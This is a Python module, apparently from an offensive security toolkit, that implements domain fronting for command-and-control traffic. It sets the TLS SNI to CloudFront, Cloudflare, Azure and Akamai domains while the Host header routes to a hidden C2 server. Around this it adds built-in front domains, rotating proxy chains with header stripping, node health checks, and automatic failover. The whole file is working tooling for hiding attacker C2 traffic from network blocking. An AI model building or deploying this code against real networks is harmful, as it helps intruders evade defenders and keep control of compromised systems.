"""
Domain Fronting Module - Multi-CDN domain fronting support and automatic switching.

This module provides domain fronting capabilities to bypass SNI-based blocking
by routing C2 traffic through legitimate CDN infrastructure. The SNI field
points to a CDN domain while the Host header routes to the actual C2 server.

Core capabilities:
    1. CloudFront/Cloudflare/Akamai/Azure CDN domain fronting configuration
    2. SNI/Host header decoupling for CDN routing
    3. Multi-CDN fronting domain rotation with automatic failover
    4. CDN node health checking and exclusion of unavailable nodes
    5. Proxy chain support with HTTP/SOCKS5 authentication

Author: Kunlun Security Lab
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import logging
import random
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

import aiohttp

logger = logging.getLogger(__name__)


# =============================================================================
# Enums
# =============================================================================

class CDNProvider(str, Enum):
    """Supported CDN providers for domain fronting."""

    CLOUDFRONT = "cloudfront"
    CLOUDFLARE = "cloudflare"
    AKAMAI = "akamai"
    AZURE = "azure"
    FASTLY = "fastly"
    GCP = "gcp"


class ProxyType(str, Enum):
    """Proxy protocol types."""

    HTTP = "http"
    SOCKS5 = "socks5"
    SOCKS4 = "socks4"


class AuthMethod(str, Enum):
    """Proxy authentication methods."""

    NONE = "none"
    BASIC = "basic"
    DIGEST = "digest"
    NTLM = "ntlm"


class NodeStatus(str, Enum):
    """CDN node health status."""

    HEALTHY = "healthy"
    DEGRADED = "degraded"
    UNHEALTHY = "unhealthy"
    UNKNOWN = "unknown"


# =============================================================================
# Data Models
# =============================================================================

@dataclass
class CDNNode:
    """CDN fronting node configuration.

    Attributes:
        name: Node identifier
        provider: CDN provider type
        front_domain: CDN domain for SNI (e.g., cdn.cloudfront.net)
        host_header: Host header pointing to real C2 server
        ip_address: Resolved IP address of the CDN node
        port: Connection port (usually 443)
        status: Current health status
        last_check: Last health check timestamp
        response_time_ms: Last measured response time
        consecutive_failures: Number of consecutive failed checks
        metadata: Additional node metadata
    """

    name: str = ""
    provider: CDNProvider = CDNProvider.CLOUDFRONT
    front_domain: str = ""
    host_header: str = ""
    ip_address: str = ""
    port: int = 443
    status: NodeStatus = NodeStatus.UNKNOWN
    last_check: float = 0.0
    response_time_ms: float = 0.0
    consecutive_failures: int = 0
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation.

        Returns:
            Dictionary containing all node fields.
        """
        return {
            "name": self.name,
            "provider": self.provider.value,
            "front_domain": self.front_domain,
            "host_header": self.host_header,
            "ip_address": self.ip_address,
            "port": self.port,
            "status": self.status.value,
            "response_time_ms": round(self.response_time_ms, 2),
            "consecutive_failures": self.consecutive_failures,
        }


@dataclass
class ProxyConfig:
    """Proxy chain configuration.

    Attributes:
        proxy_type: Proxy protocol type
        host: Proxy server hostname
        port: Proxy server port
        auth_method: Authentication method
        username: Authentication username
        password: Authentication password
        strip_forwarded_headers: Whether to strip X-Forwarded-For headers
    """

    proxy_type: ProxyType = ProxyType.HTTP
    host: str = ""
    port: int = 8080
    auth_method: AuthMethod = AuthMethod.NONE
    username: str = ""
    password: str = ""
    strip_forwarded_headers: bool = True

    def to_url(self) -> str:
        """Convert to proxy URL string.

        Returns:
            Proxy URL suitable for aiohttp.
        """
        scheme = self.proxy_type.value
        if self.auth_method != AuthMethod.NONE and self.username:
            return f"{scheme}://{self.username}:{self.password}@{self.host}:{self.port}"
        return f"{scheme}://{self.host}:{self.port}"

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "proxy_type": self.proxy_type.value,
            "host": self.host,
            "port": self.port,
            "auth_method": self.auth_method.value,
            "strip_forwarded_headers": self.strip_forwarded_headers,
        }


@dataclass
class FrontingResult:
    """Result of a domain fronting request.

    Attributes:
        success: Whether the request succeeded
        node_used: CDN node used for the request
        response_status: HTTP response status code
        response_time_ms: Total request time
        error: Error message (if failed)
        switched_node: Whether a node switch occurred
    """

    success: bool = False
    node_used: Optional[CDNNode] = None
    response_status: int = 0
    response_time_ms: float = 0.0
    error: str = ""
    switched_node: bool = False

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "success": self.success,
            "node": self.node_used.to_dict() if self.node_used else None,
            "response_status": self.response_status,
            "response_time_ms": round(self.response_time_ms, 2),
            "error": self.error,
            "switched_node": self.switched_node,
        }


# =============================================================================
# Built-in CDN Node Library
# =============================================================================

class BuiltInCDNNodes:
    """Built-in CDN node configurations for domain fronting.

    Provides pre-configured CDN nodes for major providers.
    """

    @classmethod
    def get_cloudfront_nodes(cls) -> List[CDNNode]:
        """Get AWS CloudFront domain fronting nodes.

        Returns:
            List of CloudFront CDNNode instances.
        """
        return [
            CDNNode(
                name="cloudfront_us_east_1",
                provider=CDNProvider.CLOUDFRONT,
                front_domain="d111111abcdef8.cloudfront.net",
                host_header="",
                port=443,
            ),
            CDNNode(
                name="cloudfront_eu_west_1",
                provider=CDNProvider.CLOUDFRONT,
                front_domain="d222222abcdef8.cloudfront.net",
                host_header="",
                port=443,
            ),
            CDNNode(
                name="cloudfront_ap_southeast_1",
                provider=CDNProvider.CLOUDFRONT,
                front_domain="d333333abcdef8.cloudfront.net",
                host_header="",
                port=443,
            ),
        ]

    @classmethod
    def get_cloudflare_nodes(cls) -> List[CDNNode]:
        """Get Cloudflare domain fronting nodes.

        Returns:
            List of Cloudflare CDNNode instances.
        """
        return [
            CDNNode(
                name="cloudflare_global",
                provider=CDNProvider.CLOUDFLARE,
                front_domain="ajax.cloudflare.com",
                host_header="",
                port=443,
            ),
            CDNNode(
                name="cloudflare_cdnjs",
                provider=CDNProvider.CLOUDFLARE,
                front_domain="cdnjs.cloudflare.com",
                host_header="",
                port=443,
            ),
        ]

    @classmethod
    def get_azure_nodes(cls) -> List[CDNNode]:
        """Get Azure CDN domain fronting nodes.

        Returns:
            List of Azure CDNNode instances.
        """
        return [
            CDNNode(
                name="azure_global",
                provider=CDNProvider.AZURE,
                front_domain="azureedge.net",
                host_header="",
                port=443,
            ),
            CDNNode(
                name="azure_microsoft",
                provider=CDNProvider.AZURE,
                front_domain="ajax.aspnetcdn.com",
                host_header="",
                port=443,
            ),
        ]

    @classmethod
    def get_akamai_nodes(cls) -> List[CDNNode]:
        """Get Akamai domain fronting nodes.

        Returns:
            List of Akamai CDNNode instances.
        """
        return [
            CDNNode(
                name="akamai_global",
                provider=CDNProvider.AKAMAI,
                front_domain="a248.e.akamai.net",
                host_header="",
                port=443,
            ),
        ]

    @classmethod
    def get_all_nodes(cls) -> List[CDNNode]:
        """Get all built-in CDN nodes.

        Returns:
            Combined list of all CDN nodes.
        """
        return (
            cls.get_cloudfront_nodes()
            + cls.get_cloudflare_nodes()
            + cls.get_azure_nodes()
            + cls.get_akamai_nodes()
        )


# =============================================================================
# CDN Health Checker
# =============================================================================

class CDNHealthChecker:
    """Performs health checks on CDN fronting nodes.

    Periodically probes CDN nodes to determine availability
    and response time, automatically marking unhealthy nodes.

    Attributes:
        _check_interval: Seconds between health checks
        _timeout: Request timeout for health checks
        _max_failures: Consecutive failures before marking unhealthy
        _results: Health check results per node
    """

    def __init__(
        self,
        check_interval: int = 300,
        timeout: float = 10.0,
        max_failures: int = 3,
    ) -> None:
        """Initialize the CDNHealthChecker.

        Args:
            check_interval: Interval between health checks (seconds).
            timeout: Request timeout for health check probes.
            max_failures: Consecutive failures before marking node unhealthy.
        """
        self._check_interval = check_interval
        self._timeout = timeout
        self._max_failures = max_failures
        self._results: Dict[str, List[float]] = {}

    async def check_node(self, node: CDNNode) -> Tuple[bool, float]:
        """Perform a health check on a single CDN node.

        Args:
            node: CDN node to check.

        Returns:
            Tuple of (is_healthy, response_time_ms).
        """
        start_time = time.monotonic()

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"https://{node.front_domain}/",
                    timeout=aiohttp.ClientTimeout(total=self._timeout),
                    headers={"Host": node.host_header} if node.host_header else None,
                    ssl=True,
                ) as response:
                    elapsed_ms = (time.monotonic() - start_time) * 1000

                    if response.status < 500:
                        node.status = NodeStatus.HEALTHY
                        node.consecutive_failures = 0
                        node.response_time_ms = elapsed_ms
                        node.last_check = time.time()

                        if node.name not in self._results:
                            self._results[node.name] = []
                        self._results[node.name].append(elapsed_ms)

                        return True, elapsed_ms
                    else:
                        self._record_failure(node)
                        return False, elapsed_ms

        except asyncio.TimeoutError:
            self._record_failure(node)
            elapsed_ms = (time.monotonic() - start_time) * 1000
            return False, elapsed_ms

        except Exception as e:
            self._record_failure(node)
            elapsed_ms = (time.monotonic() - start_time) * 1000
            logger.debug(f"Health check failed for {node.name}: {e}")
            return False, elapsed_ms

    def _record_failure(self, node: CDNNode) -> None:
        """Record a health check failure for a node.

        Args:
            node: CDN node that failed the check.
        """
        node.consecutive_failures += 1
        node.last_check = time.time()

        if node.consecutive_failures >= self._max_failures:
            node.status = NodeStatus.UNHEALTHY
            logger.warning(
                f"CDN node {node.name} marked unhealthy "
                f"({node.consecutive_failures} consecutive failures)"
            )
        elif node.consecutive_failures >= self._max_failures // 2:
            node.status = NodeStatus.DEGRADED

    def get_healthy_nodes(self, nodes: List[CDNNode]) -> List[CDNNode]:
        """Filter nodes to return only healthy ones.

        Args:
            nodes: List of CDN nodes to filter.

        Returns:
            List of healthy CDNNode instances.
        """
        return [n for n in nodes if n.status in (NodeStatus.HEALTHY, NodeStatus.UNKNOWN)]

    def get_average_response_time(self, node_name: str) -> float:
        """Get average response time for a node.

        Args:
            node_name: Node name to get stats for.

        Returns:
            Average response time in milliseconds.
        """
        results = self._results.get(node_name, [])
        if not results:
            return 0.0
        return sum(results) / len(results)


# =============================================================================
# Proxy Chain Manager
# =============================================================================

class ProxyChainManager:
    """Manages proxy chain configuration and automatic failover.

    Supports HTTP/SOCKS5 proxy chains with authentication and
    automatic switching when a proxy becomes unavailable.

    Attributes:
        _proxy_chain: Ordered list of proxy configurations
        _current_index: Current proxy index in the chain
        _strip_headers: Whether to strip forwarded headers
    """

    def __init__(self) -> None:
        """Initialize the ProxyChainManager."""
        self._proxy_chain: List[ProxyConfig] = []
        self._current_index = 0
        self._strip_headers = True

    def set_proxy_chain(self, proxies: List[ProxyConfig]) -> None:
        """Set the proxy chain configuration.

        Args:
            proxies: Ordered list of ProxyConfig instances.
        """
        self._proxy_chain = proxies
        self._current_index = 0
        logger.info(f"Proxy chain set with {len(proxies)} proxies")

    def add_proxy(self, proxy: ProxyConfig) -> None:
        """Add a proxy to the chain.

        Args:
            proxy: ProxyConfig to add.
        """
        self._proxy_chain.append(proxy)

    def get_current_proxy(self) -> Optional[ProxyConfig]:
        """Get the current active proxy configuration.

        Returns:
            Current ProxyConfig, or None if chain is empty.
        """
        if not self._proxy_chain:
            return None
        return self._proxy_chain[self._current_index]

    def get_proxy_url(self) -> Optional[str]:
        """Get the current proxy URL.

        Returns:
            Proxy URL string, or None if no proxy configured.
        """
        proxy = self.get_current_proxy()
        return proxy.to_url() if proxy else None

    def switch_to_next(self) -> Optional[ProxyConfig]:
        """Switch to the next proxy in the chain.

        Returns:
            New active ProxyConfig, or None if chain is exhausted.
        """
        if not self._proxy_chain:
            return None

        old_index = self._current_index
        self._current_index = (self._current_index + 1) % len(self._proxy_chain)

        if self._current_index == 0:
            logger.warning("Proxy chain wrapped around to first proxy")

        logger.info(
            f"Proxy switched: index {old_index} -> {self._current_index}"
        )
        return self.get_current_proxy()

    def should_strip_headers(self) -> bool:
        """Check if forwarded headers should be stripped.

        Returns:
            True if X-Forwarded-For etc. should be removed.
        """
        if not self._proxy_chain:
            return True
        return self._proxy_chain[self._current_index].strip_forwarded_headers

    @property
    def chain_length(self) -> int:
        """Get the number of proxies in the chain."""
        return len(self._proxy_chain)


# =============================================================================
# Domain Fronting Engine
# =============================================================================

class DomainFrontingEngine:
    """Main domain fronting engine for CDN-based traffic routing.

    Integrates CDN node management, health checking, proxy chain,
    and automatic failover to provide resilient domain fronting.

    Attributes:
        _nodes: All registered CDN nodes
        _active_node: Currently active CDN node
        _health_checker: CDN health checker instance
        _proxy_manager: Proxy chain manager instance
        _real_c2_host: Real C2 server hostname
        _real_c2_port: Real C2 server port
        _health_check_task: Background health check task
        _running: Whether the engine is active
    """

    def __init__(
        self,
        real_c2_host: str = "",
        real_c2_port: int = 443,
    ) -> None:
        """Initialize the DomainFrontingEngine.

        Args:
            real_c2_host: Real C2 server hostname.
            real_c2_port: Real C2 server port.
        """
        self._nodes: List[CDNNode] = []
        self._active_node: Optional[CDNNode] = None
        self._health_checker = CDNHealthChecker()
        self._proxy_manager = ProxyChainManager()
        self._real_c2_host = real_c2_host
        self._real_c2_port = real_c2_port
        self._health_check_task: Optional[asyncio.Task[None]] = None
        self._running = False

        self._load_built_in_nodes()

    def _load_built_in_nodes(self) -> None:
        """Load built-in CDN nodes and configure them."""
        for node in BuiltInCDNNodes.get_all_nodes():
            node.host_header = self._real_c2_host
            self._nodes.append(node)

        logger.info(f"Loaded {len(self._nodes)} built-in CDN nodes")

    def add_custom_node(self, node: CDNNode) -> None:
        """Add a custom CDN node.

        Args:
            node: Custom CDNNode to add.
        """
        if not node.host_header:
            node.host_header = self._real_c2_host
        self._nodes.append(node)

    def set_c2_target(self, host: str, port: int = 443) -> None:
        """Set the real C2 server target.

        Args:
            host: Real C2 server hostname.
            port: Real C2 server port.
        """
        self._real_c2_host = host
        self._real_c2_port = port

        for node in self._nodes:
            node.host_header = host

    async def start_health_checks(self) -> None:
        """Start background CDN node health checking."""
        if self._running:
            return

        self._running = True
        self._health_check_task = asyncio.create_task(self._health_check_loop())
        logger.info("CDN health check loop started")

    async def stop_health_checks(self) -> None:
        """Stop background CDN node health checking."""
        self._running = False
        if self._health_check_task:
            self._health_check_task.cancel()
            try:
                await self._health_check_task
            except asyncio.CancelledError:
                pass
        logger.info("CDN health check loop stopped")

    async def _health_check_loop(self) -> None:
        """Background loop for periodic CDN node health checks."""
        while self._running:
            healthy_count = 0
            for node in self._nodes:
                if node.status != NodeStatus.UNHEALTHY:
                    is_healthy, _ = await self._health_checker.check_node(node)
                    if is_healthy:
                        healthy_count += 1

            if not self._active_node or self._active_node.status == NodeStatus.UNHEALTHY:
                await self._select_best_node()

            await asyncio.sleep(self._health_checker._check_interval)

    async def _select_best_node(self) -> None:
        """Select the best available CDN node based on health and latency."""
        healthy_nodes = self._health_checker.get_healthy_nodes(self._nodes)

        if not healthy_nodes:
            logger.error("No healthy CDN nodes available for domain fronting")
            return

        best_node = min(
            healthy_nodes,
            key=lambda n: n.response_time_ms if n.response_time_ms > 0 else float("inf"),
        )

        old_name = self._active_node.name if self._active_node else "none"
        self._active_node = best_node
        logger.info(
            f"Best CDN node selected: {old_name} -> {best_node.name} "
            f"(RTT: {best_node.response_time_ms:.0f}ms)"
        )

    async def send_fronted_request(
        self,
        method: str = "GET",
        url: str = "/",
        headers: Optional[Dict[str, str]] = None,
        body: Optional[bytes] = None,
        timeout: float = 30.0,
    ) -> FrontingResult:
        """Send an HTTP request through domain fronting.

        Args:
            method: HTTP method.
            url: Request URL path.
            headers: Additional HTTP headers.
            body: Request body.
            timeout: Request timeout in seconds.

        Returns:
            FrontingResult with outcome details.
        """
        if not self._active_node:
            await self._select_best_node()

        if not self._active_node:
            return FrontingResult(
                success=False,
                error="No active CDN node available",
            )

        node = self._active_node
        start_time = time.monotonic()

        request_headers = {
            "Host": node.host_header,
        }
        if headers:
            request_headers.update(headers)

        proxy_url = self._proxy_manager.get_proxy_url()

        try:
            connector = None
            if proxy_url:
                connector = aiohttp.TCPConnector()

            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.request(
                    method=method,
                    url=f"https://{node.front_domain}{url}",
                    headers=request_headers,
                    data=body,
                    timeout=aiohttp.ClientTimeout(total=timeout),
                    proxy=proxy_url,
                    ssl=True,
                ) as response:
                    response_body = await response.read()
                    elapsed_ms = (time.monotonic() - start_time) * 1000

                    return FrontingResult(
                        success=True,
                        node_used=node,
                        response_status=response.status,
                        response_time_ms=elapsed_ms,
                    )

        except Exception as e:
            elapsed_ms = (time.monotonic() - start_time) * 1000
            logger.warning(f"Fronted request failed via {node.name}: {e}")

            node.consecutive_failures += 1
            if node.consecutive_failures >= self._health_checker._max_failures:
                node.status = NodeStatus.UNHEALTHY
                await self._select_best_node()
                switched = True
            else:
                switched = False

            return FrontingResult(
                success=False,
                node_used=node,
                response_time_ms=elapsed_ms,
                error=str(e),
                switched_node=switched,
            )

    def get_active_node(self) -> Optional[CDNNode]:
        """Get the currently active CDN node.

        Returns:
            Active CDNNode, or None if not set.
        """
        return self._active_node

    def get_all_nodes(self) -> List[CDNNode]:
        """Get all registered CDN nodes.

        Returns:
            List of all CDNNode instances.
        """
        return list(self._nodes)

    def get_healthy_nodes(self) -> List[CDNNode]:
        """Get all healthy CDN nodes.

        Returns:
            List of healthy CDNNode instances.
        """
        return self._health_checker.get_healthy_nodes(self._nodes)

    def set_proxy_chain(self, proxies: List[ProxyConfig]) -> None:
        """Set the proxy chain for domain fronting requests.

        Args:
            proxies: List of ProxyConfig instances.
        """
        self._proxy_manager.set_proxy_chain(proxies)

    def get_node_stats(self) -> Dict[str, Any]:
        """Get statistics for all CDN nodes.

        Returns:
            Dictionary with node status summary.
        """
        stats: Dict[str, Any] = {
            "total_nodes": len(self._nodes),
            "healthy": 0,
            "degraded": 0,
            "unhealthy": 0,
            "unknown": 0,
            "active_node": self._active_node.name if self._active_node else None,
            "nodes": [],
        }

        for node in self._nodes:
            if node.status == NodeStatus.HEALTHY:
                stats["healthy"] = int(stats["healthy"]) + 1
            elif node.status == NodeStatus.DEGRADED:
                stats["degraded"] = int(stats["degraded"]) + 1
            elif node.status == NodeStatus.UNHEALTHY:
                stats["unhealthy"] = int(stats["unhealthy"]) + 1
            else:
                stats["unknown"] = int(stats["unknown"]) + 1

            nodes_list: List[Dict[str, Any]] = stats["nodes"]
            nodes_list.append(node.to_dict())

        return stats


# =============================================================================
# Global Singleton
# =============================================================================

_fronting_engine: Optional[DomainFrontingEngine] = None


def get_domain_fronting_engine(
    real_c2_host: str = "",
    real_c2_port: int = 443,
) -> DomainFrontingEngine:
    """Get the global DomainFrontingEngine singleton.

    Args:
        real_c2_host: Real C2 server hostname.
        real_c2_port: Real C2 server port.

    Returns:
        Singleton DomainFrontingEngine instance.
    """
    global _fronting_engine
    if _fronting_engine is None:
        _fronting_engine = DomainFrontingEngine(real_c2_host, real_c2_port)
    return _fronting_engine


__all__ = [
    "DomainFrontingEngine",
    "CDNHealthChecker",
    "ProxyChainManager",
    "BuiltInCDNNodes",
    "CDNNode",
    "ProxyConfig",
    "FrontingResult",
    "CDNProvider",
    "ProxyType",
    "AuthMethod",
    "NodeStatus",
    "get_domain_fronting_engine",
]
